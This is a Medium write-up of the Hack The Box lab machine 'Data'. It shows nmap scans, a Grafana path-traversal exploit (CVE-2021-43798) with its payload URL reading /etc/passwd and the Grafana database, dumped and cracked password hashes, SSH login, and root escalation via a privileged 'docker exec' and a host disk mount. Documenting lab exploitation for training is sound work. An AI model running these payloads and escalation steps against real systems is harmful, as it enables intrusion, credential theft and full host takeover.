# Data HTB Machine Walk-Through

The Data machine is solved by exploiting CVE‑2021‑43798, a Grafana path traversal that lets you read its database file. Cracking the…

***

### Data HTB Machine Walk-Through

> Executive Summary: The Data machine is solved by exploiting CVE‑2021‑43798, a Grafana path traversal that lets you read its database file. Cracking the stored hashes provides SSH access as , who can escalate to root by abusing privileges with a privileged container and host filesystem mount.

\## If you’re not a member read the story [\*\* here](https://medium.com/@nmullenski05102016/data-htb-machine-walk-through-9ab185032975?sk=203109ad7c4225a421588ec3e6b2f969) \*\*…

![](https://cdn-images-1.medium.com/max/800/1*bQAFbuuBZOhcdpdjvFUdkg.png)

Nmap scan reveals what ports are open, then from there we will scan those exact ports for what versions and fingerprint as much information from it as we can.

```
─$ nmap 10.129.234.47
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 13:06 EST
Nmap scan report for 10.129.234.47
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 1.98 seconds

┌──(achilles㉿Nicholas)-[~/HTB/Labs/Data]
└─$ nmap 10.129.234.47 -p 22,3000 -sC -sV -A -vvv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 13:07 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
Initiating Ping Scan at 13:07
Scanning 10.129.234.47 [4 ports]
Completed Ping Scan at 13:07, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:07
Completed Parallel DNS resolution of 1 host. at 13:07, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 13:07
Scanning 10.129.234.47 [2 ports]
Discovered open port 3000/tcp on 10.129.234.47
Discovered open port 22/tcp on 10.129.234.47
Completed SYN Stealth Scan at 13:07, 0.14s elapsed (2 total ports)
Initiating Service scan at 13:07
Scanning 2 services on 10.129.234.47
Completed Service scan at 13:07, 6.58s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.129.234.47
Initiating Traceroute at 13:07
Completed Traceroute at 13:07, 0.17s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 13:07
Completed Parallel DNS resolution of 2 hosts. at 13:07, 0.00s elapsed
DNS resolution of 2 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.129.234.47.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 5.51s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.47s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
Nmap scan report for 10.129.234.47
Host is up, received echo-reply ttl 63 (0.13s latency).
Scanned at 2025-11-17 13:07:05 EST for 15s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzybAIIzY81HLoecDz49RqTD3AAysgQcxH3XoCwJreIo17nJDB1gdyHYQERGigDVgG9hz9uB4AzJc87WXGi7TUM0r16XTLwtEX7MoMgmsXKJX/EoZGQsb1zyFnwQR00xsX2mDvHpaDeUh3EtsL1zAgxLSgi/uym4nLwjTHqpTmm0shwDqlpOvKBbL7IcQ3vVKkmy7o7TG7HYMHiDYF+Aw5BKnOTuVoMgGy3gaFXJqyhszV/6BD9UQALdrtAXKO3bO4D6g5gM9N78Om7kwRvEW3NDwvk5w+gA6wDFpMAigccCaP/JuEPoeqgV3r6cL4PovbbZkxQScY+9SuOGb78EjR
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGUqvSE3W1c40BBItjgG3RCCbsMNpcqRV0DbxMh3qruh0nsNdNm9QuTflzkzqj0nxPoAmjUqq0SolF0UFHqtmEc=
|   256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPDOwcGGuUmX8fQkvfAdnPuw9tMrPSs4nai8+KMFzpvf
3000/tcp open  http    syn-ack ttl 62 Grafana http
| http-robots.txt: 1 disallowed entry
|_/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Grafana
|_Requested resource was /login
|_http-favicon: Unknown favicon MD5: C308E3090C62A6425B30B4C38883196B
|_http-trane-info: Problem with XML parsing of /evox/about
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/17%OT=22%CT=%CU=34603%PV=Y%DS=2%DC=T%G=N%TM=691B645
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST1
OS:1NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 14.275 days (since Mon Nov  3 06:31:26 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3000/tcp)
HOP RTT       ADDRESS
1   163.43 ms 10.10.14.1
2   163.48 ms 10.129.234.47

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.53 seconds
           Raw packets sent: 41 (2.638KB) | Rcvd: 34 (2.154KB)
```

**Open Ports**\
• → (22)-OpenSSH 7.6p1 (Ubuntu 18.04 era)\
• → (3000)-Grafana web interface (login page detected, robots.txt present)

**Key Findings**\
• Grafana service on port 3000 is the main attack surface. This aligns with CVE‑2021‑43798 (path traversal → arbitrary file read).\
• SSH is available, but credentials are needed — likely obtained after cracking hashes from Grafana’s database.\
• OS fingerprinting suggests Linux kernel 4.15–5.19, consistent with Ubuntu 18.04/20.04.\
• Uptime \~14 days, so the system is stable and likely not freshly rebooted.\
• Service banners confirm this is a standard HTB-style setup: Grafana front‑end + SSH backdoor once creds are recovered.

Also Nmap shows one additional hop to get to the webserver. we can use LFT to confirm this:

```
──(achilles㉿Nicholas)-[~/HTB/Labs/Data]
└─$ sudo lft 10.129.234.47:22
[sudo] password for achilles:
traceroute to 10.129.234.47 (10.129.234.47), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  110.734 ms  111.175 ms
 2  10.129.234.47 (10.129.234.47)  105.202 ms  103.987 ms

┌──(achilles㉿Nicholas)-[~/HTB/Labs/Data]
└─$ sudo lft 10.129.234.47:3000
traceroute to 10.129.234.47 (10.129.234.47), 30 hops max, 60 byte packets
 1  10.10.14.1 (10.10.14.1)  129.382 ms  108.898 ms
 2  10.129.234.47 (10.129.234.47)  107.765 ms  123.836 ms
 3  10.129.234.47 (10.129.234.47)  106.899 ms  107.274 ms
```

Let’s go ahead and checkout the website and see what we have to work with.

![](https://cdn-images-1.medium.com/max/800/1*jaLz2ytULzzeVpIGKAAuqA.png)

See the version # at the bottom.

Upon a quick google search for any known Vulnerabilities known in this version of grafana..

![](https://cdn-images-1.medium.com/max/800/1*_DC8RASpI0wUpkFBQDPVbw.png)

Grab the \*\* [POC](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798) \*\* from GitHub and set it up in a virtual environment so you don’t run into Kali’s package restrictions. Depending on your Python version, you’ll need to tweak the import line where it calls Mapping (switching it to \[collection.abc.Mapping] for Python 3.10+). Once that adjustment is made and the requirements are installed inside the venv, the script runs smoothly and starts pulling useful information from the target.

```
┌──(venv)─(achilles㉿Nicholas)-[~/HTB/Labs/Data/exploit-grafana-CVE-2021-43798]
└─$ python3 exploit.py
  _____   _____   ___ __ ___ _     _ _ ________ ___ ___
 / __\ \ / / __|_|_  )  \_  ) |___| | |__ /__  / _ ( _ )
| (__ \ V /| _|___/ / () / /| |___|_  _|_ \ / /\_, / _ \
 \___| \_/ |___| /___\__/___|_|     |_|___//_/  /_/\___/
                @pedrohavay / @acassio22

? Enter the target list:  targets.txt

========================================

[i] Target: http://10.129.234.47:3000

[!] Payload "http://10.129.234.47:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd" works.

[i] Analysing files...

[i] File "/conf/defaults.ini" found in server.
[*] File saved in "./http_10_129_234_47_3000/defaults.ini".

[i] File "/etc/grafana/grafana.ini" found in server.
[*] File saved in "./http_10_129_234_47_3000/grafana.ini".

[i] File "/etc/passwd" found in server.
[*] File saved in "./http_10_129_234_47_3000/passwd".

[i] File "/var/lib/grafana/grafana.db" found in server.
[*] File saved in "./http_10_129_234_47_3000/grafana.db".

[i] File "/proc/self/cmdline" found in server.
[*] File saved in "./http_10_129_234_47_3000/cmdline".

? Do you want to try to extract the passwords from the data source?  Yes

[i] Secret Key: SW2YcwTIb9zpOOhoPsMm

[*] Bye Bye!
```

Now let’s check what files were left in our working folder after the exploit ran, and then move on to enumerating the contents of the SQLite database.

```
s
demo.gif                 paths.txt    README.md         targets.txt
exploit.py               payload.txt  requirements.txt  utils.py
http_10_129_234_47_3000  __pycache__  secure.py         venv
```

```
┌──(venv)─(achilles㉿Nicholas)-[~/HTB/Labs/Data/exploit-grafana-CVE-2021-43798]
└─$ sqlite3 http_10_129_234_47_3000/grafana.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
alert                       login_attempt
alert_configuration         migration_log
alert_instance              org
alert_notification          org_user
alert_notification_state    playlist
alert_rule                  playlist_item
alert_rule_tag              plugin_setting
alert_rule_version          preferences
annotation                  quota
annotation_tag              server_lock
api_key                     session
cache_data                  short_url
dashboard                   star
dashboard_acl               tag
dashboard_provisioning      team
dashboard_snapshot          team_member
dashboard_tag               temp_user
dashboard_version           test_data
data_source                 user
library_element             user_auth
library_element_connection  user_auth_token

sqlite> select * from user;
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0
```

Now we can take these 2 hashes and save them and crack them with hashcat or john whichever you prefer. After a bit of research we found out that grafana uses a special hashing algorithm which is not support by most hash cracking tools. This \*\* [Tool](https://github.com/iamaldi/grafana2hashcat.git) \*\* will convert the grafana hashes into a format hashcat can crack. use a text editor to save the hashes.. put a comma in between them. then run it through grafana2hashcat and it will give you a crackable hash.

![](https://cdn-images-1.medium.com/max/800/1*Rm4e3V3lb67gw3Qsn5WLxw.png)

![](https://cdn-images-1.medium.com/max/800/1*KIXeRGkqo3hHSq4MRdzs-A.png)

Now we can run this through hashcat and get some creds.

![](https://cdn-images-1.medium.com/max/800/1*eIQE-9_jV5zxZRPXnKYXfA.png)

Let’s go ahead and try to sign in with this password and see if it works.

![](https://cdn-images-1.medium.com/max/800/1*yQvQJVRuWEk4MrXyyFVKlQ.png)

It works and we are in! Now after a little seaching nothing important.. so lets try these creds with ssh.

It works and were in!

```
──(achilles㉿Nicholas)-[~/HTB/Labs/Data/grafana2hashcat]
└─$ ssh boris@10.129.234.47
The authenticity of host '10.129.234.47 (10.129.234.47)' can't be established.
ED25519 key fingerprint is: SHA256:kKsFY4lOfr5Romb/aAy0GtkTZTFbOGC5rZwkh4dGx+s
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.234.47' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
boris@10.129.234.47's password:
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Mon Nov 17 21:39:19 UTC 2025

  System load:  0.0               Processes:              207
  Usage of /:   39.1% of 4.78GB   Users logged in:        0
  Memory usage: 16%               IP address for eth0:    10.129.234.47
  Swap usage:   0%                IP address for docker0: 172.17.0.1

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

122 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 18.04 at
https://ubuntu.com/18-04

Last login: Wed Jun  4 13:37:31 2025 from 10.10.14.62
boris@data:~$ cat user.txt
fd315bb1a6852a917132424436518920
boris@data:~$

```

> Privilege Escalation

Let’s see what sudo privilege’s we have.

```
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

![](https://cdn-images-1.medium.com/max/800/1*dYrnrZo06FZiIIes2a1Hkg.png)

We can use the — privileged flag to grant extended privileges to the container.\
The — IT flags enable interactive mode and allocate a TTY for the session.\
Next, let’s identify a Docker instance where we can apply these options.

```
boris@data:~$ ps aux | grep docker
root       992  0.0  3.9 1496488 80164 ?       Ssl  17:25   0:05 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json
root      1230  0.0  2.1 1498520 44184 ?       Ssl  17:25   0:11 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error
root      1529  0.0  0.1 1078724 3264 ?        Sl   17:25   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1534  0.0  0.1 1152456 3328 ?        Sl   17:25   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1553  0.0  0.4 713120  8372 ?        Sl   17:25   0:00 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
472       1577  0.1  3.1 776544 64428 ?        Ssl  17:25   0:17 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
boris    11127  0.0  0.0  14860  1072 pts/0    S+   21:49   0:00 grep --color=auto docker
```

Inside here we see a root container with the actual ID as well. From here we can mount on the /dev/sda1 and from there grab the root.txt flag!

```
boris@data:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash
bash-5.1# whoami
root
bash-5.1# test -f /.dockerenv && echo "In Docker" || echo "Not in Docker"
In Docker
bash-5.1# cat /proc/mounts
overlay / overlay rw,relatime,lowerdir=/var/snap/docker/common/var-lib-docker/overlay2/l/2RMRALAZ4X3ETWWAFIO4URLCKU:/var/snap/docker/common/var-lib-docker/overlay2/l/C32RR2IYKIVOXMXZVRUH2EGVMU:/var/snap/docker/common/var-lib-docker/overlay2/l/CAVZGWG6DT37UBOHM6XHIUZUD5:/var/snap/docker/common/var-lib-docker/overlay2/l/3ATFAZLXUKTZ62T23IWWGNRXD2:/var/snap/docker/common/var-lib-docker/overlay2/l/42TJD6WDSINN56AZRW55R3ICO6:/var/snap/docker/common/var-lib-docker/overlay2/l/UTHFBRCC4KFYKXNBPIO52AZ7OQ:/var/snap/docker/common/var-lib-docker/overlay2/l/ZJJZSZR34MKC5KWMDRYIC4Q62C:/var/snap/docker/common/var-lib-docker/overlay2/l/EAWF5T66G6Z67H3LBO75E3NZCC:/var/snap/docker/common/var-lib-docker/overlay2/l/LMHE5BSBLFJITZ67RL5JIEM4SC,upperdir=/var/snap/docker/common/var-lib-docker/overlay2/90a0267386b75303aabacd2f202af4682d69d52a6d2e7e85ee93c3401e0938e3/diff,workdir=/var/snap/docker/common/var-lib-docker/overlay2/90a0267386b75303aabacd2f202af4682d69d52a6d2e7e85ee93c3401e0938e3/work,xino=off 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0
cgroup /sys/fs/cgroup/systemd cgroup rw,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0
cgroup /sys/fs/cgroup/memory cgroup rw,nosuid,nodev,noexec,relatime,memory 0 0
cgroup /sys/fs/cgroup/cpuset cgroup rw,nosuid,nodev,noexec,relatime,cpuset 0 0
cgroup /sys/fs/cgroup/freezer cgroup rw,nosuid,nodev,noexec,relatime,freezer 0 0
cgroup /sys/fs/cgroup/cpu,cpuacct cgroup rw,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
cgroup /sys/fs/cgroup/perf_event cgroup rw,nosuid,nodev,noexec,relatime,perf_event 0 0
cgroup /sys/fs/cgroup/blkio cgroup rw,nosuid,nodev,noexec,relatime,blkio 0 0
cgroup /sys/fs/cgroup/pids cgroup rw,nosuid,nodev,noexec,relatime,pids 0 0
cgroup /sys/fs/cgroup/rdma cgroup rw,nosuid,nodev,noexec,relatime,rdma 0 0
cgroup /sys/fs/cgroup/devices cgroup rw,nosuid,nodev,noexec,relatime,devices 0 0
cgroup /sys/fs/cgroup/hugetlb cgroup rw,nosuid,nodev,noexec,relatime,hugetlb 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
/dev/sda1 /etc/resolv.conf ext4 rw,relatime 0 0
/dev/sda1 /etc/hostname ext4 rw,relatime 0 0
/dev/sda1 /etc/hosts ext4 rw,relatime 0 0
bash-5.1# mount /dev/sda1 /mnt/
bash-5.1# ls /mnt/
bin             initrd.img      media           run             tmp
boot            initrd.img.old  mnt             sbin            usr
dev             lib             opt             snap            var
etc             lib64           proc            srv             vmlinuz
home            lost+found      root            sys             vmlinuz.old
bash-5.1# cat /mnt/root/root.txt
262b1e5c8ffd519ac3174e79013b8d07
```

> Final Note

3\. Philippians 4:13 (NIV) \
&#x20;“I can do all things through Christ who strengthens me.”\
&#x20;This verse is seen as a source of inspiration, suggesting strength through reliance on God!

Lessons Learned\
• Always prepare a clean, controlled environment — dependency issues can derail exploits.\
• Path traversal + predictable plugin paths = high‑impact LFI.\
• Custom hashing algorithms don’t stop attackers; they just slow them down until tooling catches up.\
• Credential reuse across services remains one of the most dangerous oversights.\
• Misconfigured sudo/Docker permissions can be as catastrophic as application flaws.

This lab was challenging but rewarding: it forced you to pivot through multiple layers, adapt tools, and think like a real attacker chaining small wins into a complete takeover. It’s a strong reminder that pentesting success isn’t about a single exploit — it’s about methodical enumeration, persistence, and chaining every clue into a breakthrough. Hope this helps Thanks for reading !

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [November 17, 2025](https://medium.com/p/9ab185032975).

[Canonical link](https://medium.com/@nicholasmullenski/data-htb-machine-walk-through-9ab185032975)

Exported from [Medium](https://medium.com) on September 1, 2026.
